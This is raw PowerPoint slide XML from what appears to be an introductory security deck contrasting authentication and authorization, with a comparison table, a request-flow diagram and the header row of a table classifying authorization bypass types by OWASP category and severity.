      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028462" y="2867620"/>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Aspect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4289108" y="2867620"/>
            <a:ext cx="4358878" cy="362903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Authentication</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9109234" y="2867620"/>
            <a:ext cx="4492943" cy="362903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="801410" y="3374231"/>
            <a:ext cx="13027581" cy="650319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028462" y="3517940"/>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Question</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4289108" y="3517940"/>
            <a:ext cx="4358878"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"Who are you?"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9109234" y="3517940"/>
            <a:ext cx="4492943"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"What can you do?"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="801410" y="4024551"/>
            <a:ext cx="13027581" cy="650319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028462" y="4168259"/>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Purpose</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4289108" y="4168259"/>
            <a:ext cx="4358878"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Verify identity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9109234" y="4168259"/>
            <a:ext cx="4492943"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Control access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="801410" y="4674870"/>
            <a:ext cx="13027581" cy="650319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028462" y="4818578"/>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Process</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4289108" y="4818578"/>
            <a:ext cx="4358878"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Login credentials</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9109234" y="4818578"/>
            <a:ext cx="4492943"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Permission checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="801410" y="5325189"/>
            <a:ext cx="13027581" cy="650319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028462" y="5468898"/>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Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4289108" y="5468898"/>
            <a:ext cx="4358878"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Username/Password</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9109234" y="5468898"/>
            <a:ext cx="4492943"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Admin vs User roles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="801410" y="5975509"/>
            <a:ext cx="13027581" cy="650319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028462" y="6119217"/>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Happens</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4289108" y="6119217"/>
            <a:ext cx="4358878"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Once at login</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9109234" y="6119217"/>
            <a:ext cx="4492943"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Every request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="801410" y="6625828"/>
            <a:ext cx="13027581" cy="650319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028462" y="6769537"/>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Bypass Impact</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4289108" y="6769537"/>
            <a:ext cx="4358878"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Account takeover</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9109234" y="6769537"/>
            <a:ext cx="4492943"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Privilege escalation</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778788"/>
            <a:ext cx="4763333" cy="595432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Visual Flow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2243852" y="1827848"/>
            <a:ext cx="10142696" cy="4642009"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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91188" y="2986833"/>
            <a:ext cx="652132" cy="652133"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10010178" y="5165771"/>
            <a:ext cx="1904228" cy="770332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Access Granted</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6"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03771" y="2988055"/>
            <a:ext cx="652132" cy="652133"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7610329" y="5165771"/>
            <a:ext cx="1904228" cy="770332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8"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16964" y="2988055"/>
            <a:ext cx="652133" cy="652133"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5223523" y="5165771"/>
            <a:ext cx="1904228" cy="770332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authentication</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10"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417115" y="2988055"/>
            <a:ext cx="652133" cy="652133"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2784546" y="5358355"/>
            <a:ext cx="1904228" cy="385166"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>User Request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="6725007"/>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This flow shows how authentication verifies identity first, followed by authorization checking permissions at every request, before granting access to resources.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852017" y="1148953"/>
            <a:ext cx="5735598" cy="519470"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Types of Authorization Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1852017" y="1712595"/>
            <a:ext cx="7063740" cy="415647"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Classification of Authorization Vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1852017" y="2293977"/>
            <a:ext cx="10926366" cy="4786551"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1389"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="2301597"/>
            <a:ext cx="10911126" cy="362903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="2375535"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Type</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="2375535"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Description</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="2375535"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OWASP Category</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="2375535"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Severity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="2664500"/>
            <a:ext cx="10911126" cy="577929"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="2738437"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
